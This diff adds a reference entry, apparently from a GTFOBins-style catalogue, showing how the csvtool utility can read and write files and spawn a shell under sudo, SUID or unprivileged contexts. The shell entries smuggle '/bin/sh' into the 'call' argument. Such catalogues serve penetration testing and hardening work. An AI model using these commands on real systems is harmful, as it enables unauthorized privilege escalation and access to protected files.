@@ -1,0 +1,47 @@
+csvtool
+=======
+
+File read
+---------
+
+[Sudo]
+    csvtool trim t /path/to/input-file
+    The file is actually parsed and manipulated as CSV.
+
+[SUID]
+    csvtool trim t /path/to/input-file
+    The file is actually parsed and manipulated as CSV.
+
+[Unprivileged]
+    csvtool trim t /path/to/input-file
+    The file is actually parsed and manipulated as CSV.
+
+File write
+----------
+
+[Sudo]
+    echo DATA >/path/to/temp-file
+csvtool trim t /path/to/temp-file -o /path/to/output-file
+    The file is actually parsed and manipulated as CSV.
+
+[SUID]
+    echo DATA >/path/to/temp-file
+csvtool trim t /path/to/temp-file -o /path/to/output-file
+    The file is actually parsed and manipulated as CSV.
+
+[Unprivileged]
+    echo DATA >/path/to/temp-file
+csvtool trim t /path/to/temp-file -o /path/to/output-file
+    The file is actually parsed and manipulated as CSV.
+
+Shell
+-----
+
+[Sudo]
+    csvtool call '/bin/sh;false' /etc/hosts
+
+[SUID]
+    csvtool call '/bin/sh;false' /etc/hosts
+
+[Unprivileged]
+    csvtool call '/bin/sh;false' /etc/hosts
